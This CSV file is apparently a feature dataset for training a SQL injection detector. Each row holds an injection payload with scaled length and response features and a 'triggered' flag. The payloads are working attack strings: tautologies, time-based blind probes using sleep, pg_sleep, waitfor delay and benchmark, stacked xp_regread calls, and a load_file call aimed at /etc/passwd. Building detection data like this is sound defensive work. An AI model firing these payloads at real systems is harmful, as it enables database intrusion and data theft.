payload,payload_length,payload_type,response_code,response_length,triggered,has_single_quote,has_angle_bracket,has_double_dash,has_equals,special_char_count,payload_type_encoded
)%20or%20('x'='x,-0.3621309946205348,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1775324956017164,0
%20or%201=1,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.3627837953600292,0
; execute immediate 'sel' || 'ect us' || 'er',-0.08757416209777638,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.06638171574672873,0
"benchmark(10000000,MD5(1))#",-0.25798874780155745,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2516330155050415,0
update,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
""";waitfor delay '0:0:__TIME__'--",-0.21065136288384048,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.029331455795066172,0
1) or pg_sleep(__TIME__)--,-0.26745622478510084,sqli,-0.4397387471509151,0.4097173497606227,0,0,0,1,0,-0.1034319756983913,0
"||(elt(-3+5,bin(15),ord(10),hex(char(45))))",-0.10650911606486316,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,0.23002036386657174,0
"""hi"""") or (""""a""""=""""a""",-0.3147936097028178,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,0.007718804156596389,0
delete,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
like,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
""" or sleep(__TIME__)#",-0.3147936097028178,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
pg_sleep(__TIME__)--,-0.32426108668636117,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.14048223565005385,0
*(|(objectclass=*)),-0.33372856366990455,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
declare @q nvarchar (200) 0x730065006c00650063 ...,-0.04023677718005942,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2516330155050415,0
or 0=0 #,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.39983405531169175,0
insert,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
1) or sleep(__TIME__)#,-0.3053261327192744,sqli,-0.4397387471509151,0.40723968026611407,0,0,0,0,0,-0.1775324956017164,0
) or ('a'='a,-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.2516330155050415,0
; exec xp_regread,-0.3526635176369914,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
*|,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
@var select @var as var into temp end --,-0.13491154701549335,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.32573353540836664,0
"1)) or benchmark(10000000,MD5(1))#",-0.19171640891675368,sqli,-0.4397387471509151,0.41467268874964003,0,0,0,0,0,-0.1775324956017164,0
asc,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
(||6),-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.32573353540836664,0
"""a"""" or 3=3--""",-0.38106594858762155,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.21458275555337897,0
""" or benchmark(10000000,MD5(1))#",-0.21065136288384048,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.21458275555337897,0
# from wapiti,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
or 0=0 --,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.3627837953600292,0
1 waitfor delay '0:0:10'--,-0.26745622478510084,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.2516330155050415,0
or 'a'='a,-0.4284033335053385,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.32573353540836664,0
"hi or 1=1 --""",-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
or a = a,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
UNION ALL SELECT,-0.3621309946205348,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
) or sleep(__TIME__)=',-0.3053261327192744,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.14048223565005385,0
")) or benchmark(10000000,MD5(1))#",-0.2011838859002971,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.1775324956017164,0
hi' or 'a'='a,-0.39053342557116494,sqli,-0.4397387471509151,0.5757212058927031,1,1,0,0,1,-0.2886832754567041,0
0,-0.5041431493736857,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
21 %,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
limit,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
or 1=1,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
or 2 > 1,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
""")) or benchmark(10000000,MD5(1))#",-0.19171640891675368,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.14048223565005385,0
PRINT,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
hi') or ('a'='a,-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.21458275555337897,0
or 3=3,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.43688431526335436,0
));waitfor delay '0:0:__TIME__'--,-0.2011838859002971,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,0.007718804156596389,0
a' waitfor delay '0:0:10'--,-0.25798874780155745,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.21458275555337897,0
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",-0.04023677718005942,sqli,-0.4397387471509151,0.42458336672767466,0,0,0,0,0,0.11886958401158407,0
or%201=1,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.39983405531169175,0
